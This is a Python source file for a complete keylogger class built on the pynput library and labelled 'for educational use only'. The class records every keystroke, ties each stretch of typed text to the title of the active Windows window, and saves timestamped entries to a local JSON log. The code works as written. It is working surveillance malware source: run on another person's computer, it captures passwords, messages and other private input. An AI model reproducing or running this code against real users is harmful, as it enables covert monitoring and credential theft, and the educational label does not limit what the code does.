"""
Key Logger Feature - Pynput demonstration class - For educational use only
"""

from pynput import keyboard
from datetime import datetime
from pathlib import Path
import ctypes, threading, json

class KeyLogger:
    '''Pynput demonstration class - For educational use only'''
    
    def __init__(self, log_file="keylog.json", inactivity_timeout=5) -> None:
        """Initialize the logger"""

        try:
            self.log_file = Path(log_file)
            self.log_file.parent.mkdir(parents=True, exist_ok=True)
            
            self.current_text = ""
            self.current_window = None  # ← Add this
            self.inactivity_timeout = inactivity_timeout
            self.last_key_time = None
            self.listener = None
            self.timer = None
            
            if not self.log_file.exists():
                self.log_file.write_text("[]", encoding="utf-8")
        except Exception as e:
            raise Exception(f"Error initializing KeyLogger in __init__ function: {e}")
    
    def _get_active_window(self) -> str:
        """Get the title of the active window using ctypes"""
        try:
            try:
                user32 = ctypes.windll.user32
                hwnd = user32.GetForegroundWindow()
                
                length = user32.GetWindowTextLengthW(hwnd)
                buff = ctypes.create_unicode_buffer(length + 1)
                user32.GetWindowTextW(hwnd, buff, length + 1)
                
                return buff.value if buff.value else "Unknown"
            except:
                return "Unknown"
        except Exception as e:
            raise Exception(f"Error getting active window in _get_active_window function: {e}")
    
    def on_press(self, key) -> None:
        """Auto callback when a key is pressed"""

        try:
            self.last_key_time = datetime.now()
            
            # Capture the window at the beginning of the sentence
            if not self.current_text:
                self.current_window = self._get_active_window()
            
            if self.timer:
                self.timer.cancel()
            
            try:
                # Normal key
                char = key.char
            
                if char is not None:
                    self.current_text += char
                    
            except AttributeError:
                # Special keys
                if key == keyboard.Key.space:
                    self.current_text += " "
                    
                elif key == keyboard.Key.enter:
                    self.current_text += "\n"
                    self._save_current_text()
                    
                elif key == keyboard.Key.backspace:
                    if self.current_text:  # Verify that the text is not empty
                        self.current_text = self.current_text[:-1]
                    
                elif key == keyboard.Key.tab:
                    self.current_text += "\t"
            
            # Start/reset inactivity timer
            self.timer = threading.Timer(self.inactivity_timeout, self._save_current_text)
            self.timer.start()
        except Exception as e:
            raise Exception(f"Error in on_press function: {e}")
        
    def on_release(self, key) -> None:
        """Callback when a key is released"""

        try:
            if key == keyboard.Key.esc:
                self._save_current_text()
                return False
        except Exception as e:
            raise Exception(f"Error in on_release function: {e}")
    
    def _save_current_text(self) -> None:
        """Save current accumulated text with window info"""

        try:
            if not self.current_text or self.current_text.isspace():
                self.current_text = ""
                self.current_window = None  # Reset
                return
            
            try:
                existing_data = json.loads(self.log_file.read_text(encoding="utf-8"))
                
                entry = {
                    "timestamp": datetime.now().isoformat(),
                    "text": self.current_text.strip(),
                    "window": self.current_window or "Unknown",  # Use captured window
                    "length": len(self.current_text.strip())
                }
                existing_data.append(entry)
                
                self.log_file.write_text(
                    json.dumps(existing_data, indent=2, ensure_ascii=False),
                    encoding="utf-8"
                )
                
                self.current_text = ""
                self.current_window = None  # Reset
                
            except Exception as e:
                backup_file = self.log_file.parent / f"keylog_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                backup_file.write_text(
                    json.dumps([{
                        "timestamp": datetime.now().isoformat(),
                        "text": self.current_text,
                        "error": str(e)
                    }], indent=2),
                    encoding="utf-8"
                )
                self.current_text = ""
                self.current_window = None  # Reset
        except Exception as e:
            raise Exception(f"Error saving current text in _save_current_text function: {e}")
    
    def start(self) -> None:
        """Start listening"""

        try:
            self.listener = keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release
            )
            self.listener.start()
            self.listener.join()
        except Exception as e:
            raise Exception(f"Error starting KeyLogger in start function: {e}")
    
    def stop(self) -> None:
        """Stop listening and save remaining text"""

        try:
            if self.timer:
                self.timer.cancel()
            self._save_current_text()
            if self.listener:
                self.listener.stop()
        except Exception as e:
            raise Exception(f"Error stopping KeyLogger in stop function: {e}")